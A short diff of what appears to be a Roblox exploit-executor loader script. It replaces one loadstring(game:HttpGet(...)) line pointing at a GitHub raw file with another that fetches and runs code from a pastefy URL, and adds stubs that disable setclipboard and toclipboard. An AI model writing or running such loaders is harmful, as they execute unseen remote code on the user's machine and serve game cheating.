@@ -1,1 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/yuusx-hub/22/refs/heads/main/Lunix-DH"))()
+setclipboard = function() end
+toclipboard = function() end
+
+loadstring(game:HttpGet("https://pastefy.app/beFd1FLk/raw"))()
